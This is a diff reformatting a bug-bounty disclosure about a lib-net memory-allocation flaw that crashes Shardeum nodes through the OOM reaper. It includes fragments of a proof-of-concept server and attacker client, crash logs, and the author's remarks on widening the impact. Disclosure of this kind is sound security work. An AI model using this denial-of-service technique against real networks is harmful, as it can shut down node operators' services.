@@ -1,5 +1,6 @@
+# 34093 - \[BC - Critical] lib-net can be used to force oom reap of shardu...
 
-# lib-net: can be used to force oom reap of shardus instances
+## lib-net: can be used to force oom reap of shardus instances
 
 Submitted on Aug 5th 2024 at 18:58:30 UTC by @riproprip for [Boost | Shardeum: Core](https://immunefi.com/bounty/shardeum-core-boost/)
 
@@ -12,58 +13,60 @@ Report severity: Critical
 Target: https://github.com/shardeum/shardeum/tree/dev
 
 Impacts:
-- Network not being able to confirm new transactions (total network shutdown)
-- RPC API crash affecting projects with greater than or equal to 25% of the market capitalization on top of the respective layer
 
-## Description
-## Brief/Intro
+* Network not being able to confirm new transactions (total network shutdown)
+* RPC API crash affecting projects with greater than or equal to 25% of the market capitalization on top of the respective layer
 
-Disclosure: Wasn't sure on the severity level / impact you would want to classify this as. 
+### Description
 
-Bug can be used to crash `shardus-instances`. 
+### Brief/Intro
 
-If used intelligently can be used to sometimes crash all the instances (without them getting restarted). Used even more complicated: Can be used to crash other processes in the OS. 
+Disclosure: Wasn't sure on the severity level / impact you would want to classify this as.
+
+Bug can be used to crash `shardus-instances`.
+
+If used intelligently can be used to sometimes crash all the instances (without them getting restarted). Used even more complicated: Can be used to crash other processes in the OS.
 
 I would find that to be severe ...
 
-## Vulnerability Details
-https://github.com/shardeum/lib-net/blob/2832f1d4c92a3efb455239f146567f21fd80e4cb/shardus_net/src/shardus_net_listener.rs#L95 allows attacker controlled allocations on the system.
+### Vulnerability Details
+
+https://github.com/shardeum/lib-net/blob/2832f1d4c92a3efb455239f146567f21fd80e4cb/shardus\_net/src/shardus\_net\_listener.rs#L95 allows attacker controlled allocations on the system.
 
 On some OS that already triggers the crash.
 
-On other OS those allocations themselves usually get delayed. But once we actually read in data in L106, the allocator has to pull in more pages till the oom reaper gets triggered. 
+On other OS those allocations themselves usually get delayed. But once we actually read in data in L106, the allocator has to pull in more pages till the oom reaper gets triggered.
 
 What the oom reaper does and when exactly it gets triggered is again highly dependent on the physical configuration of the box and the OS. It is however always a kill of a system process.
 
-Different tested configs: 
+Different tested configs:
 
 * On a box with 1gb of physical ram I have seen crashes after sending 2512kb of data. Those crashes however couldn't reliably reap the restarting processes that "shardus start" apparently runs in the background. So that process starts a new shardus intstance. With more tinkering it's likely possible however to reap the restart process also.
+* On a box with 8gb of ram I have seen crashes after sending much closer to 8gb of data. Sending data in parallel to multiple instances (in theory) reduces the complete amount of bytes that need to be send. (Again depends on the allocation algorithms used be the OS). Notably those crashes reliably reap the "restart" (I think you call it pm?) process on my linode box, leaving no shardus-instance running.
+* To widen the impact: In theory one could allocate close to the maximum amount of ram on the system and wait till any other process on the system allocates ram. That one would somewhat likely get reaped on modern linux systems. (Not a Mac guy ...)
 
-* On a box with 8gb of ram I have seen crashes after sending much closer to 8gb of data. Sending data in parallel to multiple instances (in theory) reduces the complete amount of bytes that need to be send. (Again depends on the allocation algorithms used be the OS). Notably those crashes reliably reap the "restart" (I think you call it pm?)  process on my linode box, leaving no shardus-instance running.
+If somebody brings up the amount of traffic when wanting to downgrade this bug: I saw references to Gzip and Brotli. Both are extremely efficient at compressing repeating patterns. For reference compression rates on the older Gzip:
 
-*  To widen the impact: In theory one could allocate close to the maximum amount of ram on the system and wait till any other process on the system allocates ram. That one would somewhat likely get reaped on modern linux systems. (Not a Mac guy ...)
+* 1Gb is 1MB in traffic
+* 14GB is 7MB in traffic
+* 64Gb is \~64 MB in traffic
 
-If somebody brings up the amount of traffic when wanting to downgrade this bug: I saw references to Gzip and Brotli. Both are extremely efficient at compressing repeating patterns. 
-For reference compression rates on the older Gzip:
-- 1Gb is  1MB in traffic
-- 14GB is 7MB in traffic
-- 64Gb is ~64 MB in traffic
+### Proof of concept
 
-
-
-## Proof of concept
-# Simple POC
+## Simple POC
 
 I have 2 POC. The simpler one shows that javascript using `lib-net` can't recover from the allocation problems. The error does not bubble up to javascript to handle. The process just dies.
 
 Please note that the server output of `memory allocation of 4294967295 bytes failed` does represent the actual amount of data sent. It's just the requested allocation the kernel finally has to fulfill after receiving `~2512kb` of data.
 
-Before you make me document the more complicated one doing the "oom reaper thing to shardeum and the instances" please keep in mind that your process.on('SIGINT|SIGTERM') handlers all just die. 
+Before you make me document the more complicated one doing the "oom reaper thing to shardeum and the instances" please keep in mind that your process.on('SIGINT|SIGTERM') handlers all just die.
 
-You can however use the net_attack code against your `shardus start N` instances. Depending on your configuration, different things will happen like explained above. I am happy to go into detail howto maximize impact.
+You can however use the net\_attack code against your `shardus start N` instances. Depending on your configuration, different things will happen like explained above. I am happy to go into detail howto maximize impact.
 
-## server
-### save as test.js
+### server
+
+#### save as test.js
+
 ```
 const port = 10001
 const address = 'localhost'
@@ -99,22 +102,27 @@ main();
         console.log('CAUGHT CLOSER TO EVENT LOOP', e);
 }
 ```
-### run
+
+#### run
+
 ```
 git clone https://github.com/shardeum/lib-net.git; 
 npm run build
 node test.js
 ```
 
-### attacker
-#### run
+#### attacker
+
+**run**
+
 ```
 cargo new net_attack
 cd net_attack
 echo 'tokio = { version = "1.39.2", features = ["full"] }' >> Cargo.toml
 ```
 
-### save as src/main.rs
+#### save as src/main.rs
+
 ```
 use std::io::Write;
 use std::net::TcpStream;
@@ -165,20 +173,24 @@ async fn main() {
     }
 ```
 
-### run
+#### run
+
 ```
 cargo build
 ```
 
+### output
 
-## output
-### server
+#### server
+
 ```
 node test.js # now wait for attacker to run
 memory allocation of 4294967295 bytes failed
 Aborted (core dumped)
 ```
-### attacker
+
+#### attacker
+
 ```
 (cmd)root@localhost:~/net_attack# ps -ef | grep "node"
 root      622235  619278  0 12:07 pts/4    00:00:00 node test.js
@@ -199,7 +211,8 @@ localhost:10000 took 2512 kb of data to explode the server
 root      622446  565054  0 12:08 pts/3    00:00:00 grep --color=auto 622235
 ```
 
-### dmesg
+#### dmesg
+
 ```
 [25332975.711693] oom-kill:constraint=CONSTRAINT_NONE,nodemask=(null),cpuset=/,mems_allowed=0,global_oom,task_memcg=/user.slice/user-0.slice/session-51052.scope,task=npm ci,pid=561123,uid=0
 [25332975.711736] Out of memory: Killed process 561123 (npm ci) total-vm:1456584kB, anon-rss:311600kB, file-rss:128kB, shmem-rss:0kB, UID:0 pgtables:4316kB oom_score_adj:0
